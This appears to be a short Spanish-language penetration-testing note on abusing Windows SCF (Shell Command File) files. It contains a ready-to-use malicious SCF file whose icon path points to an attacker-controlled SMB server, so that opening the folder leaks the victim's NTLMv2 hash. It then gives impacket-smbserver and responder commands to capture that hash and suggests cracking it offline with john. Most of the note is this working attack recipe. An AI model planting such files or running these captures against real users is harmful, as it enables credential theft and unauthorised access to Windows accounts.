-----
- Tags: #teoria #practica #explotación 
----
# SCF File Attacks 

### En el contexto de **Windows**, un archvio **SCF (Shell Command File)** es un tipo de archivo de script que contiene comandos que peuden ser ejecutados por el Explorador de Windows u otros componentes del sistema operativo. Estos archivos se utilizan para automatizar tareas relacionadas con el sistema, configuraciones y operaciones en el entorno de Windows. 

-----
# Explotación 

### No es nuevo que los **SCF (Shell Command FIle)** pueden ser usados para distintas operaciones. Una de estas operaciones puede permitirle al **SCF** acceder a un path de un servicio SMB permitiendo así a los atacantes capturar el hash NTLMv2.

#### File.scf
```scf
[Shell]
Command=2
IconFile=\\{our_smb_server_ip}\{folder}\test.ico
[TaskBar]
Command=ToggleDesktop
```

### Una vez creado el archivo, al momento de ser ejecutado intentará cargar un icono desde el recurso indicado, por lo que desde nuestra máquina de atacante podríamos crear un servidor SMB o estar en escucha con el **responder** con el fin de capturar el hash NTLMv2

#### impacket-smbserver
```bash
# Crear un servidor smb para recibir la petición a la hora de ejecutar el archivo
impacket-smbserver -smb2support smbFolder $(pwd)
```
#### responder
```bash
responder -w --lm -v -I {interfaz}
```

### Una vez capturado el hash, solo queda intentar crackearlo de manera ofline con herramientas como **john**.

